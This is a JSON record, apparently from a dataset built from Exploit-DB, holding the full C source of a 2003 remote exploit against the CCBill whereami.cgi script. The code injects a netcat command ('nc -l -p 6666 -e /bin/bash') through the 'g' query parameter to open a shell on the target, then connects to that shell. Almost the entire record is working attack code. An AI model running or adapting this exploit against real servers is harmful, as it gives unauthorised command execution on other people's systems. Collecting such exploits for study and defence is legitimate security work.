{
  "id": "53",
  "title": "CCBILL CGI - &#039;ccbillx.c&#039; &#039;whereami.cgi&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "/*\r\n* =====================================\r\n* CCBILL CGI Remote Exploit for /ccbill/whereami.cgi\r\n* By: Knight420\r\n* 7/07/03\r\n*\r\n* spawns a shell with netcat and attempts to connect \r\n* into the server on port 6666 to gain access of the \r\n* webserver uid\r\n* \r\n* (C) COPYRIGHT Blue Ballz , 2003\r\n* all rights reserved\r\n* =====================================\r\n*\r\n*/\r\n\r\n#include <sys/types.h>\r\n#include <sys/time.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <fcntl.h>\r\n#include <netdb.h>\r\n\r\n\r\nunsigned long int\tnet_resolve (char *host);\r\nint\t\t\tnet_connect (struct sockaddr_in *cs, char *server,\r\n\t\t\tunsigned short int port, int sec);\r\n\r\nunsigned char ccbill[] = \r\n\"GET /ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\\x0d\\x0a\"\r\n\"GET /cgi-bin/ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\\x0d\\x0a\"\r\n\"GET /cgi-bin/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\\x0d\\x0a\";\r\n\r\nint\r\nmain (int argc, char **argv)\r\n{\r\n\tint\t\t\tsocket;\r\n\tchar  *TARGET     =     \"TARGET\";\r\n\tchar\t\t\t*server;\r\n\tunsigned short int\tport;\r\n\tstruct sockaddr_in\tsa;\r\n\r\n\tif (argc != 3) {\r\n\t\tsystem(\"clear\");\r\n\t\tprintf (\"[CCBILL CGI Remote Exploit By:Knight420]\\n\"\r\n\t\t\"usage: %s <host> <port>\\n\");\r\n\t\texit (EXIT_FAILURE);\r\n\t}\r\n\tsetenv (TARGET, argv[1], 1);\r\n\tserver = argv[1];\r\n\tport = atoi (argv[2]);\r\n\r\n\tsocket = net_connect (&sa, server, port, 35);\r\n\tif (socket <= 0) {\r\n\t\tperror (\"net_connect\");\r\n\t\texit (EXIT_FAILURE);\r\n\t}\r\n\r\n\twrite (socket, ccbill, strlen (ccbill));\r\n\tsleep (1);\r\n\tclose (socket);\r\n\r\n\tprintf (\"[CCBILL CGI Remote Exploit By:Knight420]\\n\");\r\n\tprintf (\"[1] evil data sent.\\n\", server);\r\n\tprintf (\"[2] connecting to shell.\\n\", server);\r\n\tsystem(\"nc ${TARGET} 6666 || echo '[-]Exploit failed!'\");\r\n\texit (EXIT_SUCCESS);\r\n}\r\n\r\nunsigned long int\r\nnet_resolve (char *host)\r\n{\r\n\tlong\t\ti;\r\n\tstruct hostent\t*he;\r\n\r\n\ti = inet_addr (host);\r\n\tif (i == -1) {\r\n\t\the = gethostbyname (host);\r\n\t\tif (he == NULL) {\r\n\t\t\treturn (0);\r\n\t\t} else {\r\n\t\t\treturn (*(unsigned long *) he->h_addr);\r\n\t\t}\r\n\t}\r\n\r\n\treturn (i);\r\n}\r\n\r\n\r\nint\r\nnet_connect (struct sockaddr_in *cs, char *server,\r\n\tunsigned short int port, int sec)\r\n{\r\n\tint\t\tn, len, error, flags;\r\n\tint\t\tfd;\r\n\tstruct timeval\ttv;\r\n\tfd_set\t\trset, wset;\r\n\r\n\t/* first allocate a socket */\r\n\tcs->sin_family = AF_INET;\r\n\tcs->sin_port = htons (port);\r\n\tfd = socket (cs->sin_family, SOCK_STREAM, 0);\r\n\tif (fd == -1)\r\n\t\treturn (-1);\r\n\r\n\tcs->sin_addr.s_addr = net_resolve (server);\r\n\tif (cs->sin_addr.s_addr == 0) {\r\n\t\tclose (fd);\r\n\t\treturn (-1);\r\n\t}\r\n\r\n\tflags = fcntl (fd, F_GETFL, 0);\r\n\tif (flags == -1) {\r\n\t\tclose (fd);\r\n\t\treturn (-1);\r\n\t}\r\n\tn = fcntl (fd, F_SETFL, flags | O_NONBLOCK);\r\n\tif (n == -1) {\r\n\t\tclose (fd);\r\n\t\treturn (-1);\r\n\t}\r\n\r\n\terror = 0;\r\n\r\n\tn = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));\r\n\tif (n < 0) {\r\n\t\tif (errno != EINPROGRESS) {\r\n\t\t\tclose (fd);\r\n\t\t\treturn (-1);\r\n\t\t}\r\n\t}\r\n\tif (n == 0)\r\n\t\tgoto done;\r\n\r\n\tFD_ZERO(&rset);\r\n\tFD_ZERO(&wset);\r\n\tFD_SET(fd, &rset);\r\n\tFD_SET(fd, &wset);\r\n\ttv.tv_sec = sec;\r\n\ttv.tv_usec = 0;\r\n\r\n\tn = select(fd + 1, &rset, &wset, NULL, &tv);\r\n\tif (n == 0) {\r\n\t\tclose(fd);\r\n\t\terrno = ETIMEDOUT;\r\n\t\treturn (-1);\r\n\t}\r\n\tif (n == -1)\r\n\t\treturn (-1);\r\n\r\n\tif (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {\r\n\t\tif (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {\r\n\t\t\tlen = sizeof(error);\r\n\t\t\tif (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {\r\n\t\t\t\terrno = ETIMEDOUT;\r\n\t\t\t\treturn (-1);\r\n\t\t\t}\r\n\t\t\tif (error == 0) {\r\n\t\t\t\tgoto done;\r\n\t\t\t} else {\r\n\t\t\t\terrno = error;\r\n\t\t\t\treturn (-1);\r\n\t\t\t}\r\n\t\t}\r\n\t} else\r\n\t\treturn (-1);\r\ndone:\r\n\tn = fcntl(fd, F_SETFL, flags);\r\n\tif (n == -1)\r\n\t\treturn (-1);\r\n\r\n\treturn (fd);\r\n}\r\n\r\n// milw0rm.com [2003-07-10]",
  "url": "https://www.exploit-db.com/exploits/53"
}